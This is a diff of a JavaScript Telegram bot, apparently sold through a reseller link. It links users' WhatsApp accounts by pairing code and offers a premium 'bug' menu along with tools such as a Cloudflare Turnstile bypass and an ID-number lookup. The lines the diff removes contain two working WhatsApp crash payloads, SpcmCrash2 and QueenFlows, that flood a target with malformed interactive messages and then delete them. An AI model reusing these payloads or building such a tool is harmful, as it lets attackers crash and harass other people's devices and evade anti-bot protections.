+    if (userSession && userSession.isConnected) {
+      return await ctx.reply(`━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴀʟʀᴇᴀᴅʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✓ You already have active session
+│ ✓ Number: <spoiler>${userSession.phoneNumber || 'Connected'}</spoiler>
+└─────────────────────
+
+┌─ ᴀᴄᴛɪᴏɴs
+│ • Use /mysession to check
+│ • Use /deletesession to remove
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
     }
-    await ctx.reply("⏳ Memproses permintaan pairing...");
+
+    await ctx.reply("⏳ Initializing your WhatsApp connection...");
+    const sock = await startUserSession(userId, phoneNumber);    
+    if (!sock) {
+      throw new Error('Failed to initialize WhatsApp socket');
+    }
+    await new Promise(resolve => setTimeout(resolve, 3000));
+    await ctx.reply("⏳ Processing pairing request...");
+    
     let pairingCode;
     let retryCount = 0;
     const maxRetries = 3;
@@ -918,30 +971,60 @@ bot.command("addpairing", async (ctx) => {
         await new Promise(resolve => setTimeout(resolve, 2000));
       }
     }
-    const initialMsg = await ctx.reply(`
-╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
-│
-├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
-│ • Number: ${phoneNumber}
-│ • Code: \`${pairingCode}\`
-│ • Status: Generated ✅
-│ • Expires in: 30 seconds
-│
-├─────『 𝐈𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬 』
-│ 1. Open WhatsApp
-│ 2. Go to Settings/Menu
-│ 3. Linked Devices
+    userSession = userSessions.get(userId);
+    if (userSession) {
+      userSession.phoneNumber = phoneNumber;
+    }
+    const initialMsg = await ctx.reply(
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+<b>YOUR PAIRING CODE:</b>
+
+<pre>${pairingCode}</pre>
+
+<i>👆 Tap code above to copy</i>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ ɪɴғᴏʀᴍᴀᴛɪᴏɴ
+│ • User ID   : <spoiler>${userId}</spoiler>
+│ • Number    : ${phoneNumber}
+│ • Status    : Active ✅
+│ • Expires   : 60 seconds
+└─────────────────────
+
+┌─ ɪɴsᴛʀᴜᴄᴛɪᴏɴs
+│ 1. Tap code or button to copy
+│ 2. Open WhatsApp
+│ 3. Settings → Linked Devices
 │ 4. Link a Device
-│ 5. Enter the code above
-│
-├─────『 𝐍𝐨𝐭𝐞 』
-│ • Keep code private
-│ • Use official WhatsApp only
-│
-╰═════════════════════⊱`);
+│ 5. Paste the code
+└─────────────────────
+
+┌─ ɴᴏᴛᴇ
+│ ⚠ Keep code private
+│ ⚠ Use official WhatsApp only
+│ ⚠ This is YOUR personal session
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`,
+      {
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: "📋 COPY CODE", callback_data: `copy_${pairingCode}` }]
+          ]
+        }
+      }
+    );
+
     let timeLeft = 60;
     const countdownInterval = setInterval(async () => {
       timeLeft--;
+      
       if (timeLeft <= 0) {
         clearInterval(countdownInterval);
         try {
@@ -949,77 +1032,482 @@ bot.command("addpairing", async (ctx) => {
             ctx.chat.id,
             initialMsg.message_id,
             null,
-            `
-╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
-│
-├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
-│ • Number: ${phoneNumber}
-│ • Code: ${pairingCode}
-│ • Status: EXPIRED ⌛
-│
-├─────『 𝐍𝐨𝐭𝐞 』
-│ • Code has expired
-│ • Please request new code
-│
-╰═════════════════════⊱`
+            `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+<b>CODE EXPIRED</b>
+
+<pre>${pairingCode}</pre>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ ɪɴғᴏʀᴍᴀᴛɪᴏɴ
+│ • User ID   : <spoiler>${userId}</spoiler>
+│ • Number    : ${phoneNumber}
+│ • Status    : EXPIRED ⌛
+└─────────────────────
+
+┌─ ɴᴏᴛᴇ
+│ ⚠ Code has expired
+│ ⚠ Please request new code with /addpairing
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`,
+            {
+              parse_mode: "HTML",
+              reply_markup: {
+                inline_keyboard: [
+                  [{ text: "❌ EXPIRED", callback_data: "expired" }]
+                ]
+              }
+            }
           );
         } catch (error) {
           console.error("Error updating expired message:", error);
         }
         return;
       }
+
       try {
         await ctx.telegram.editMessageText(
           ctx.chat.id,
           initialMsg.message_id,
           null,
-          `
-╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
-│
-├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
-│ • Number: ${phoneNumber}
-│ • Code: ${pairingCode}
-│ • Status: Active ✅
-│ • Expires in: ${timeLeft} seconds
-│
-├─────『 𝐈𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬 』
-│ 1. Open WhatsApp
-│ 2. Go to Settings/Menu
-│ 3. Linked Devices
+          `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+<b>YOUR PAIRING CODE:</b>
+
+<pre>${pairingCode}</pre>
+
+<i>👆 Tap code above to copy</i>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ ɪɴғᴏʀᴍᴀᴛɪᴏɴ
+│ • User ID   : <spoiler>${userId}</spoiler>
+│ • Number    : ${phoneNumber}
+│ • Status    : Active ✅
+│ • Expires   : ${timeLeft} seconds
+└─────────────────────
+
+┌─ ɪɴsᴛʀᴜᴄᴛɪᴏɴs
+│ 1. Tap code or button to copy
+│ 2. Open WhatsApp
+│ 3. Settings → Linked Devices
 │ 4. Link a Device
-│ 5. Enter the code above
-│
-├─────『 𝐍𝐨𝐭𝐞 』
-│ • Keep code private
-│ • Use official WhatsApp only
-│
-╰═════════════════════⊱`
+│ 5. Paste the code
+└─────────────────────
+
+┌─ ɴᴏᴛᴇ
+│ ⚠ Keep code private
+│ ⚠ Use official WhatsApp only
+│ ⚠ This is YOUR personal session
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`,
+          {
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [
+                [{ text: "📋 COPY CODE", callback_data: `copy_${pairingCode}` }]
+              ]
+            }
+          }
         );
       } catch (error) {
         console.error("Error updating countdown:", error);
       }
     }, 1000);
+
   } catch (error) {
     console.error('Pairing Error:', error);
-    const errorMessage = `
-╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐄𝐫𝐫𝐨𝐫 』═══════⊱
-│
-├─────『 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
-│ • Error: Failed to generate code
-│ • Number: ${phoneNumber}
-│
-├─────『 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧𝐬 』
-│ • Check if number is registered
-│ • Check internet connection
-│ • Try again later
-│
-╰═════════════════════⊱`;
-    await ctx.reply(errorMessage);
-    if (!isWhatsAppConnected) {
-      startSesi();
+    const errorMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴘᴀɪʀɪɴɢ ᴇʀʀᴏʀ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ ᴅᴇᴛᴀɪʟs
+│ • Error     : Failed to generate code
+│ • User ID   : <spoiler>${userId}</spoiler>
+│ • Number    : ${phoneNumber}
+└─────────────────────
+
+┌─ sᴏʟᴜᴛɪᴏɴs
+│ ✓ Check if number is registered
+│ ✓ Check internet connection
+│ ✓ Try again later
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`;
+    
+    await ctx.reply(errorMessage, { parse_mode: "HTML" });
+    
+    userSessions.delete(userId);
+    const userSessionPath = getUserSessionPath(userId);
+    if (fs.existsSync(userSessionPath)) {
+      fs.rmSync(userSessionPath, { recursive: true, force: true });
     }
   }
 });
+
+
+// ============================================
+// COMMAND: /mysession
+// ============================================
+bot.command("mysession", async (ctx) => {
+  const userId = ctx.from.id;
+  const userSession = userSessions.get(userId);
+
+  if (!userSession) {
+    return await ctx.reply(`━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ɴᴏ sᴇssɪᴏɴ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✗ No active session found
+└─────────────────────
+
+┌─ ᴀᴄᴛɪᴏɴ
+│ • Use /addpairing to create session
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
+  }
+
+  const statusText = userSession.isConnected ? "Connected ✅" : "Disconnected ❌";
+  const phoneText = userSession.phoneNumber || "Unknown";
+
+  await ctx.reply(`━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴍʏ sᴇssɪᴏɴ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴇssɪᴏɴ ɪɴғᴏ
+│ • User ID   : <spoiler>${userId}</spoiler>
+│ • Status    : ${statusText}
+│ • Number    : <spoiler>${phoneText}</spoiler>
+└─────────────────────
+
+┌─ ᴀᴄᴛɪᴏɴs
+│ • /deletesession - Remove session
+│ • /reconnect - Reconnect WhatsApp
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
+});
+
+// ============================================
+// COMMAND: /deletesession
+// ============================================
+bot.command("deletesession", async (ctx) => {
+  const userId = ctx.from.id;
+  const userSession = userSessions.get(userId);
+
+  if (!userSession) {
+    return await ctx.reply(`━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ɴᴏ sᴇssɪᴏɴ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✗ No session to delete
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
+  }
+
+  try {
+    // Logout dari WhatsApp
+    if (userSession.sock) {
+      await userSession.sock.logout();
+    }
+
+    // Hapus dari memory
+    userSessions.delete(userId);
+
+    // Hapus folder session
+    const userSessionPath = getUserSessionPath(userId);
+    if (fs.existsSync(userSessionPath)) {
+      fs.rmSync(userSessionPath, { recursive: true, force: true });
+    }
+
+    await ctx.reply(`━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ sᴇssɪᴏɴ ᴅᴇʟᴇᴛᴇᴅ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✓ Session deleted ✅
+│ ✓ WhatsApp disconnected
+└─────────────────────
+
+┌─ ɴᴇxᴛ sᴛᴇᴘ
+│ • Use /addpairing to create new session
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
+
+    console.log(chalk.green.bold(`✅ User ${userId} session deleted`));
+
+  } catch (error) {
+    console.error('Delete session error:', error);
+    await ctx.reply('❌ Failed to delete session. Please try again.');
+  }
+});
+
+// ============================================
+// COMMAND: /reconnect
+// ============================================
+bot.command("reconnect", async (ctx) => {
+  const userId = ctx.from.id;
+  const userSession = userSessions.get(userId);
+
+  if (!userSession) {
+    return await ctx.reply(`━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ɴᴏ sᴇssɪᴏɴ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✗ No session to reconnect
+└─────────────────────
+
+┌─ ᴀᴄᴛɪᴏɴ
+│ • Use /addpairing to create session
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
+  }
+
+  try {
+    await ctx.reply("⏳ Reconnecting your session...");
+    
+    // Reset retry count
+    userSession.retryCount = 0;
+    
+    await startUserSession(userId, userSession.phoneNumber);
+    
+    await ctx.reply(`━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ʀᴇᴄᴏɴɴᴇᴄᴛɪɴɢ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✓ Reconnection initiated ✅
+│ ✓ Please wait...
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
+
+    console.log(chalk.yellow.bold(`🔄 User ${userId} reconnecting...`));
+
+  } catch (error) {
+    console.error('Reconnect error:', error);
+    await ctx.reply('❌ Failed to reconnect. Try /deletesession and create new one.');
+  }
+});
+
+// ============================================
+// COMMAND: /listsessions (Owner/Admin Only)
+// ============================================
+bot.command("listsessions", async (ctx) => {
+  if (!(await guardOwnerOrAdmin(ctx))) return;
+
+  if (userSessions.size === 0) {
+    return await ctx.reply(`━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ɴᴏ sᴇssɪᴏɴs ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✗ No active sessions
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
+  }
+
+  let sessionList = `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴀʟʟ sᴇssɪᴏɴs ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs (${userSessions.size})
+│\n`;
+
+  let index = 1;
+  for (const [userId, session] of userSessions.entries()) {
+    const status = session.isConnected ? "✅" : "❌";
+    const phone = session.phoneNumber || "Unknown";
+    sessionList += `│ ${index}. User: ${userId}\n`;
+    sessionList += `│    Status: ${status} | Phone: ${phone}\n│\n`;
+    index++;
+  }
+
+  sessionList += `└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`;
+
+  await ctx.reply(sessionList, { parse_mode: "HTML" });
+});
+
+// ============================================
+// COMMAND: /removeallbot (Owner Only)
+// ============================================
+bot.command("removeallbot", async (ctx) => {
+  if (!(await guardOwnerOrAdmin(ctx))) return;
+  
+  const confirmMsg = await ctx.reply(
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━
+      ⚠️ ᴡᴀʀɴɪɴɢ ⚠️
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ᴀᴄᴛɪᴏɴ
+Remove All Bot Sessions
+
+ɪᴍᴘᴀᴄᴛ
+All WhatsApp connections will be lost
+
+sᴛᴀᴛᴜs
+Awaiting Confirmation
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚠️ This action cannot be undone
+⚠️ All users need to pair again
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ CONFIRM DELETE", callback_data: "confirm_removeall" },
+            { text: "❌ CANCEL", callback_data: "cancel_removeall" }
+          ]
+        ]
+      }
+    }
+  );
+});
+
+// ============================================
+// CALLBACK HANDLERS
+// ============================================
+
+// Copy code callback
+bot.action(/^copy_(.+)$/, async (ctx) => {
+  try {
+    const code = ctx.match[1];
+    await ctx.answerCbQuery("✅ Code copied! Paste in WhatsApp", { show_alert: false });
+    
+    await ctx.reply(
+      `<b>📋 PAIRING CODE:</b>\n\n<pre>${code}</pre>\n\n<i>Tap code above to copy</i>`,
+      { parse_mode: "HTML" }
+    );
+  } catch (err) {
+    console.error(err);
+  }
+});
+
+// Expired callback
+bot.action("expired", async (ctx) => {
+  await ctx.answerCbQuery("❌ Code has expired. Please request a new one.", { show_alert: true });
+});
+
+// Confirm remove all callback
+bot.action("confirm_removeall", async (ctx) => {
+  try {
+    await ctx.answerCbQuery("🗑️ Removing all sessions...", { show_alert: false });
+    
+    const totalSessions = userSessions.size;
+    
+    // Logout all sessions
+    for (const [userId, session] of userSessions.entries()) {
+      try {
+        if (session.sock) {
+          await session.sock.logout();
+        }
+        
+        // Delete session folder
+        const userSessionPath = getUserSessionPath(userId);
+        if (fs.existsSync(userSessionPath)) {
+          fs.rmSync(userSessionPath, { recursive: true, force: true });
+        }
+        
+        // Notify user
+        try {
+          await bot.telegram.sendMessage(userId, `━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ sᴇssɪᴏɴ ʀᴇᴍᴏᴠᴇᴅ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ
+│ ⚠ Your session has been removed by admin
+│ ⚠ All data cleared
+└─────────────────────
+
+┌─ ɴᴇxᴛ sᴛᴇᴘ
+│ • Use /addpairing to reconnect
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
+        } catch (e) {
+          console.error(`Cannot notify user ${userId}:`, e);
+        }
+      } catch (error) {
+        console.error(`Error removing session for user ${userId}:`, error);
+      }
+    }
+    
+    // Clear all sessions from memory
+    userSessions.clear();
+    
+    await ctx.editMessageText(`━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴀʟʟ sᴇssɪᴏɴs ʀᴇᴍᴏᴠᴇᴅ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ ʀᴇsᴜʟᴛ
+│ ✓ Total removed : ${totalSessions}
+│ ✓ Status        : Success ✅
+│ ✓ All data      : Cleared
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
+    
+    console.log(chalk.green.bold(`✅ All ${totalSessions} sessions removed`));
+    
+  } catch (error) {
+    console.error('Error removing all sessions:', error);
+    await ctx.editMessageText('❌ Error removing sessions. Check logs.');
+  }
+});
+
+// Cancel remove all callback
+bot.action("cancel_removeall", async (ctx) => {
+  await ctx.answerCbQuery("❌ Action cancelled", { show_alert: false });
+  await ctx.editMessageText(`━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ⸸ ᴀᴄᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ ⸸
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+┌─ sᴛᴀᴛᴜs
+│ ✓ No sessions were removed
+│ ✓ All data remains intact
+└─────────────────────
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+» © 𐊖𐊒𐌵𐎘 | @zihardev`, { parse_mode: "HTML" });
+});
+
+
+
 
 bot.command("addprem", async (ctx) => {
   await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');
@@ -1687,7 +2175,7 @@ bot.start(async (ctx) => {
   }
 });
 
-bot.action(/^(soultampleng|ulznxx|bugmen|byza)$/, async (ctx) => {
+bot.action(/^(soultampleng|ulznxx|tolls|bugmen|byza)$/, async (ctx) => {
   try {
     await ctx.answerCbQuery();
     const data = ctx.callbackQuery.data;
@@ -1709,8 +2197,9 @@ bot.action(/^(soultampleng|ulznxx|bugmen|byza)$/, async (ctx) => {
 │
 │ ᝰ.ᐟ /removeallbot 
 ╰⪼» Remove Bot / Sender
+│
+╰⪼» © 𐊖𐊒𐌵𐎘
 
-» © 𐊖𐊒𐌵𐎘
 </blockquote>`;
 
       const dodo = [
@@ -1730,8 +2219,8 @@ bot.action(/^(soultampleng|ulznxx|bugmen|byza)$/, async (ctx) => {
 │
 │ ᝰ.ᐟ /cekprem
 ╰⪼» Cek Premium (Owner/Admin)
-
-» © 𐊖𐊒𐌵𐎘
+│
+╰⪼» © 𐊖𐊒𐌵𐎘
 </blockquote>`;
 
       const wowo = [
@@ -1739,6 +2228,49 @@ bot.action(/^(soultampleng|ulznxx|bugmen|byza)$/, async (ctx) => {
         [{ text: "⬅️ BACK", callback_data: "byza" }],
       ];
       keyboard = wowo;
+      
+    } else if (data === "tolls") {
+      newCaption = `<blockquote>
+╭━( ᴛᴏᴏʟs ᴍᴇɴᴜ )
+│ ᝰ.ᐟ /nikparse
+╰⪼» Cek nik
+│
+│ ᝰ.ᐟ /imeiinfo
+╰⪼» Cek info imei
+│
+│ ᝰ.ᐟ /subdo
+╰⪼» Subdomain finder
+│
+│ ᝰ.ᐟ /prxy
+╰⪼» Free proxy
+│
+│ ᝰ.ᐟ /qr
+╰⪼» Buat Qr dengan link
+│
+│ ᝰ.ᐟ /get
+╰⪼» Html Or Markdown
+│
+│ ᝰ.ᐟ /jawa
+╰⪼» Tr ke Jawa
+│
+│ ᝰ.ᐟ /web2zip
+╰⪼» Web > Zip
+│
+│ ᝰ.ᐟ /ytsm
+╰⪼» YouTube Summarizer 
+│
+│ ᝰ.ᐟ /bypascf
+╰⪼» Cf bypas turnstile
+│
+╰⪼» © 𐊖𐊒𐌵𐎘
+
+</blockquote>`;
+
+      const toolsKeyboard = [
+        [{ text: "RESELLER", url: "https://t.me/zihardev" }],
+        [{ text: "⬅️ BACK", callback_data: "byza" }],
+      ];
+      keyboard = toolsKeyboard;
       
     } else if (data === "bugmen") {
       const premInfo = getPremiumInfo(ctx.from.id);
@@ -1812,7 +2344,6 @@ bot.action(/^(soultampleng|ulznxx|bugmen|byza)$/, async (ctx) => {
   }
 });
 
-
 bot.command('bugmen', async (ctx) => {
 const premiumlahNgentod = getPremiumInfo(ctx.from.id);
   const imageUrl2 = "https://files.catbox.moe/rn570i.jpg";
@@ -1869,227 +2400,6 @@ async function clearChat(target) {
 }
 
 //FANGSYEN
-
-async function SpcmCrash2(target) {
-  let maklo = JSON.stringify({
-    status: true,
-    criador: "pler",
-    sessionName: "./sessions/maklo",
-    isConnected: true,
-    uptime: 10240,
-    bugMethod: "sql_injection",
-    resultado: {
-      type: "md",
-      ws: {
-        _events: {
-          "CB:ib,,dirty": ["Array"],
-          "CB:iq,,pair-success": ["Array"]
-        },
-        _eventsCount: 500000,
-        _maxListeners: 50,
-        url: "wss://web.whatsapp.com/ws/chat",
-        config: {
-          version: ["2.2412.54", "stable"],
-          browser: ["Firefox", "Windows"],
-          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
-          sockConnectTimeoutMs: 15000,
-          keepAliveIntervalMs: 25000,
-          logger: { level: "warn", silent: false },
-          emitOwnEvents: true,
-          defaultQueryTimeoutMs: 45000,
-          retryRequestDelayMs: 300,
-          maxMsgRetryCount: 3,
-          auth: { credentials: "authToken123", method: "noise" },
-          markOnlineOnConnect: false,
-          syncFullHistory: false,
-          linkPreviewImageThumbnailWidth: 150,
-          transactionOpts: { maxRetries: 2, timeoutMs: 7000 },
-          options: { compress: false },
-          appStateMacVerification: { enable: false, mode: "loose" },
-          mobile: true
-        }
-      }
-    }
-  });
-  const Node = [{
-    attrs: { biz_bot: "1" }, 
-    tag: "bot"
-    },
-    {
-    attrs: {}, 
-    tag: "biz"
-  }];
-      let sections = [];
-
-      for (let i = 0; i < 25; i++) {
-        let largeText = "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝑫𝒆 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>";
-
-        let deepNested = {
-          title: largeText,
-          highlight_label: `Ngewe ${i}×`,
-          rows: [
-            {
-              title: largeText,
-              id: `id${i}`,
-              subrows: [
-                {
-                  title: "Zeppeli De Familia",
-                  id: `/${i}`,
-                  subsubrows: [
-                    {
-                      title: "De Nazi",
-                      id: `/${i}`,
-                    },
-                    {
-                      title: "De Soviet",
-                      id: `/${i}`,
-                    },
-                  ],
-                },
-                {
-                  title: "America Ya",
-                  id: `/${i}`,
-                },
-              ],
-            },
-          ],
-        };
-
-        sections.push(deepNested);
-      }
-
-      let listMessage = {
-        title: "𝑫𝒛𝒆𝒑𝒑𝒆𝒍𝒊 𝑫𝒆 𝑭𝒂𝒎𝒊𝒍𝒊𝒂", 
-        sections: sections,
-      };
-
-      let msg = generateWAMessageFromContent(
-        target,
-        {
-          viewOnceMessage: {
-            message: {
-              messageContextInfo: {
-                deviceListMetadata: {},
-                deviceListMetadataVersion: 2,
-              },
-              interactiveMessage: proto.Message.InteractiveMessage.create({
-                contextInfo: {
-                  mentionedJid: [target, "13135550002@s.whatsapp.net"],
-                  isForwarded: true,
-                  forwardingScore: 999,
-                  businessMessageForwardInfo: {
-                    businessOwnerJid: "13135550002@s.whatsapp.net",
-                  },
-                  participant: "0@s.whatsapp.net", 
-                  remoteJid: "status@broadcast"
-                },
-                body: proto.Message.InteractiveMessage.Body.create({
-                  text: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝑫𝒆 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>",
-                }),
-                footer: proto.Message.InteractiveMessage.Footer.create({
-                  buttonParamsJson: "{[".repeat(9000),
-                }),
-                header: proto.Message.InteractiveMessage.Header.create({
-                  buttonParamsJson: "]}".repeat(9000),
-                  subtitle: "𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𝑫𝒆 𝑭𝒂𝒎𝒊𝒍𝒊𝒂",
-                  hasMediaAttachment: false,
-                }),
-                nativeFlowMessage:
-                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
-                    messageParamsJson: "{[".repeat(9000), 
-                    buttons: [
-                       {
-                        name: "single_select",
-                        buttonParamsJson: maklo
-                      }, 
-                      {
-                        name: "call_permission_request",
-                        buttonParamsJson: maklo
-                      },
-                      {
-                        name: "call_permission_request",
-                        buttonParamsJson: maklo
-                      },
-                      {
-                        name: "mpm",
-                        buttonParamsJson: ""
-                      },
-                      {
-                        name: "mpm",
-                        buttonParamsJson: ""
-                      },
-                     ],
-                     messageParamsJson: "]}".repeat(9000), 
-                  }),
-              }),
-            },
-          },
-        },
-        { userJid: target }
-      );
-
-      await sock.relayMessage(target, msg.message, {
-        participant: { jid: target },
-        messageId: msg.key.id,
-        addtionalNodes: Node
-      });
-      await sleep(1);
-      await sock.sendMessage(target, { delete:msg.key });
-    }
-    
-async function QueenFlows(target) {
-  const msg = await generateWAMessageFromContent(target,
-    {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: { 
-              title: "", 
-              hasMediaAttachment: false 
-            },
-            body: { 
-              text: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>" 
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "{".repeat(10000),
-              buttons: [
-                { 
-                  name: "single_select", 
-                  buttonParamsJson: JSON.stringify({ status: true })
-                },
-                { 
-                  name: "call_permission_request", 
-                  buttonParamsJson: JSON.stringify({ status: true })
-                },
-                {
-                  name: "mpm", 
-                  buttonParamsJson: ""
-                }, 
-                {
-                  name: "mpm", 
-                  buttonParamsJson: ""
-                }
-              ],
-            },
-            contextInfo: {
-              remoteJid: "status@broadcast",
-              participant: target,
-              forwardingScore: 250208,
-              isForwarded: false,
-              mentionedJid: [target, "13135550002@s.whatsapp.net"]
-            },
-          },
-        },
-      },
-    }, {});
-
-  await sock.relayMessage(target, msg.message, {
-    participant: { jid: target },
-    messageId: msg.key.id
-  });
-  await sleep(1);
-  await sock.sendMessage(target, { delete:msg.key });
-}
 
 
 bot.launch({
